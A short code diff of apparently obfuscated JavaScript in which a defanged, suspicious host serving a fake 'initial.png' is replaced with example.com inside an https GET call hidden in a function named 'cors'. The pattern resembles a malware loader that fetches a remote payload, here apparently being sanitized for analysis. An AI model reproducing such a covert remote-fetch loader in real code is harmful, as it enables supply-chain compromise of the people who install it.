@@ -4,7 +4,7 @@ function f() {
       c = "utf8",
       ht = require("https"),
       cors = () => {
-          const request = ht["get"]("hxxps://api.jz-aws[.]info/initial.png", 
+          const request = ht["get"]("hxxps://example.com/initial.png", 
           function(response) {
               let data = "";
               response.on(data, r => {
